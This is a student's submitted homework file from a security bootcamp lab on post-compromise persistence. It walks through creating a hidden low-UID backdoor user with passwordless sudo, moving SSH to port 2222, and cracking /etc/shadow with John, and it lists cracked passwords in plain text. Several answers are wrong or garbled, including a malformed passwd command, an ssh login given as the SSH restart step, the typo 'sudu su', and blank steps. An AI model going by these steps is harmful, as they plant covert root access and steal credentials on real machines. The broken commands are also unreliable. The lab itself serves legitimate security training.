## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - sudo adduser sysd

2. Give your secret user a password: 
    - `sudo passwd sysd Igotitnow 

3. Give your secret user a system UID < 1000:
    - #usermod -u 900 sysd

4. Give your secret user the same GID:
   - #usermod -g 900 sysd

5. Give your secret user full `sudo` access without the need for a password:
   -  sudo usermod -aG sudo sysd
sudo ALL=(ALL:ALL) NOPASSWD: ALL
6. Test that `sudo` access works without your password:
sudo -lU sysd
    ```bash
    Your bash commands here
    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:sudo nano /etc/ssh/sshd_config

    ```bash
    Your bash commands here
    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:ssh sysadmi@192.168.6.105 -p 22
    - 

2. Exit the `root` account:
    - pkill -u sysadmin

3. SSH to the target machine using your `sysd` account and port `2222`:
    - ssh sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:
    - sudu su

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - ssh sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:[]([[[url](url)](url)](url))

    - sudo john /etc/shadow
    computer:stallman
    freedom:babbage
    trustno1:mitnik
    dragon:lovelace
    lakers:turing
    passw0rd:sysadmin
    Goodluck!:student

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

